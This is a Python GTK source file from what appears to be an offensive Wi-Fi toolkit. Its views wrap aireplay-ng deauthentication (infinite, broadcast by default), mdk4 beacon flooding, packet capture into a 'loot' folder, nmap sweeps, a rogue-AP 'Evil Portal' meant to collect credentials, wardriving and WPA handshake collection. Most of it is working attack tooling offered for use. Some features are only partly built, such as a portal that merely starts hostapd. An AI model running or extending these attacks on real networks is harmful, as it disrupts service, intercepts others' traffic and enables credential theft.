import subprocess
import shutil
from pathlib import Path
import gi
gi.require_version("Gtk", "4.0")
from gi.repository import Gtk, GLib
from bruce.gui.tool_view import ToolView
from bruce.core.state import STATE
from bruce.core.iface import set_monitor_mode, set_managed_mode, get_wifi_interfaces


def _iface() -> str:
    return STATE.wifi_iface or (get_wifi_interfaces() or ["wlan0"])[0]


class ScanAPsView(ToolView):
    def __init__(self):
        super().__init__("Scan APs")

    def run_tool(self):
        iface = _iface()
        self.log(f"Scanning on {iface}...", "amber")
        rc, out = self.run_cmd(["iwlist", iface, "scanning"], use_sudo=False)
        if rc != 0 or not out.strip():
            self.log("iwlist failed, trying iw scan...", "dim")
            rc, out = self.run_cmd(["iw", "dev", iface, "scan"], use_sudo=True)
        for line in out.splitlines():
            self.log_auto(line)
        count = out.count("Cell ") + out.count("BSS ")
        self.log(f"◈ Scan complete — {count} network(s) found.", "amber")


class DeauthView(ToolView):
    def __init__(self):
        self._target_entry = Gtk.Entry()
        self._target_entry.set_placeholder_text("Target BSSID (or 'all')")
        self._target_entry.add_css_class("field-input")
        self._ap_entry = Gtk.Entry()
        self._ap_entry.set_placeholder_text("AP BSSID")
        self._ap_entry.add_css_class("field-input")
        self._count_entry = Gtk.Entry()
        self._count_entry.set_text("0")
        self._count_entry.add_css_class("field-input")
        self._count_entry.set_max_width_chars(6)
        super().__init__("WiFi Deauther")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        for lbl, widget in [("Target", self._target_entry), ("AP", self._ap_entry), ("Count (0=∞)", self._count_entry)]:
            l = Gtk.Label(label=lbl)
            l.add_css_class("field-label")
            bar.append(l)
            bar.append(widget)
        return bar

    def run_tool(self):
        iface = _iface()
        target = self._target_entry.get_text().strip() or "FF:FF:FF:FF:FF:FF"
        ap = self._ap_entry.get_text().strip()
        count = self._count_entry.get_text().strip() or "0"
        if not ap:
            self.log("AP BSSID required.", "red")
            return
        self.log(f"Setting {iface} to monitor mode...", "amber")
        ok, msg = set_monitor_mode(iface)
        self.log(msg, "amber" if ok else "red")
        if not ok:
            return
        cmd = ["aireplay-ng", "--deauth", count, "-a", ap]
        if target.lower() != "all":
            cmd += ["-c", target]
        cmd.append(iface)
        self.stream_cmd(cmd, use_sudo=True)
        set_managed_mode(iface)
        self.log("◈ Done. Interface restored to managed.", "amber")


class BeaconSpamView(ToolView):
    def __init__(self):
        self._ssid_entry = Gtk.Entry()
        self._ssid_entry.set_placeholder_text("SSID list file or single SSID")
        self._ssid_entry.add_css_class("field-input")
        self._ssid_entry.set_hexpand(True)
        super().__init__("Beacon Spam")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="SSID/File")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._ssid_entry)
        return bar

    def run_tool(self):
        iface = _iface()
        ssid = self._ssid_entry.get_text().strip() or "FreeWiFi"
        ok, msg = set_monitor_mode(iface)
        self.log(msg, "amber" if ok else "red")
        if not ok:
            return
        if shutil.which("mdk4"):
            self.log("Using mdk4 beacon flood...", "amber")
            tmp = Path("/tmp/bruce_ssids.txt")
            tmp.write_text(ssid + "\n")
            self.stream_cmd(["mdk4", iface, "b", "-f", str(tmp)], use_sudo=True)
        else:
            self.log("mdk4 not found — install with: sudo pacman -S mdk4", "red")
        set_managed_mode(iface)


class RawSnifferView(ToolView):
    def __init__(self):
        self._filter_entry = Gtk.Entry()
        self._filter_entry.set_placeholder_text("BPF filter (e.g. 'eapol')")
        self._filter_entry.add_css_class("field-input")
        self._filter_entry.set_hexpand(True)
        super().__init__("RAW Sniffer / PCAP")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="Filter")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._filter_entry)
        return bar

    def run_tool(self):
        iface = _iface()
        bpf = self._filter_entry.get_text().strip()
        out_file = STATE.loot_path / "pcap" / "capture.pcap"
        ok, msg = set_monitor_mode(iface)
        self.log(msg, "amber" if ok else "red")
        self.log(f"Saving to {out_file}", "dim")
        cmd = ["tcpdump", "-i", iface, "-w", str(out_file)]
        if bpf:
            cmd.append(bpf)
        self.stream_cmd(cmd, use_sudo=True)
        set_managed_mode(iface)


class ScanHostsView(ToolView):
    def __init__(self):
        self._range_entry = Gtk.Entry()
        self._range_entry.set_placeholder_text("e.g. 192.168.1.0/24")
        self._range_entry.add_css_class("field-input")
        self._range_entry.set_hexpand(True)
        super().__init__("Scan Hosts")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="Range")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._range_entry)
        return bar

    def run_tool(self):
        target = self._range_entry.get_text().strip() or "192.168.1.0/24"
        self.log(f"Scanning {target}...", "amber")
        self.stream_cmd(["nmap", "-sn", "-T4", "--open", target], use_sudo=True)


class EvilPortalView(ToolView):
    def __init__(self):
        self._ssid_entry = Gtk.Entry()
        self._ssid_entry.set_text("FreeWiFi")
        self._ssid_entry.add_css_class("field-input")
        super().__init__("Evil Portal (GARMR)")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="SSID")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._ssid_entry)
        return bar

    def run_tool(self):
        ssid = self._ssid_entry.get_text().strip() or "FreeWiFi"
        creds_file = STATE.loot_path / "creds" / "portal_creds.txt"
        self.log(f"Starting rogue AP: {ssid}", "amber")
        self.log(f"Credentials → {creds_file}", "dim")
        self.log("Requires: hostapd, dnsmasq, python-flask", "dim")

        if not shutil.which("hostapd"):
            self.log("hostapd not found — install: sudo pacman -S hostapd dnsmasq", "red")
            return

        hostapd_conf = f"""interface=wlan0
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        Path("/tmp/bruce_hostapd.conf").write_text(hostapd_conf)
        self.log("Launching hostapd...", "amber")
        self.stream_cmd(["hostapd", "/tmp/bruce_hostapd.conf"], use_sudo=True)


class WardrivingView(ToolView):
    def __init__(self):
        super().__init__("Wardriving")

    def run_tool(self):
        iface = _iface()
        out_file = STATE.loot_path / "wardriving" / "wardrive.csv"
        self.log(f"Wardriving on {iface}", "amber")
        self.log(f"Output → {out_file}", "dim")
        self.log("Scanning networks (no GPS module detected — coordinates will be 0,0)...", "amber")
        while self._running:
            rc, out = self.run_cmd(["iw", "dev", iface, "scan"], use_sudo=True)
            ssids = [l.split("SSID:")[-1].strip() for l in out.splitlines() if "SSID:" in l]
            bssids = [l.split("BSS ")[-1].split("(")[0].strip() for l in out.splitlines() if l.startswith("\tBSS ")]
            if ssids:
                self.log(f"Found {len(ssids)} networks:", "amber")
                for s in ssids:
                    self.log(f"  {s}")
            import time
            time.sleep(10)
        self.log("◈ Wardriving stopped.", "amber")


class BrucegotchiView(ToolView):
    def __init__(self):
        super().__init__("Brucegotchi")

    def run_tool(self):
        iface = _iface()
        self.log("Brucegotchi: multi-channel deauth + handshake collection", "amber")
        ok, msg = set_monitor_mode(iface)
        self.log(msg, "amber" if ok else "red")
        if not ok:
            return
        out_dir = STATE.loot_path / "eapol"
        self.log(f"EAPOL captures → {out_dir}", "dim")
        self.log("Scanning for targets...", "amber")
        import time
        channels = list(range(1, 14))
        chan_idx = 0
        while self._running:
            ch = channels[chan_idx % len(channels)]
            subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                           capture_output=True)
            self.log(f"[ch {ch:02d}] listening...", "dim")
            time.sleep(2)
            chan_idx += 1
        set_managed_mode(iface)
        self.log("◈ Brucegotchi stopped.", "amber")
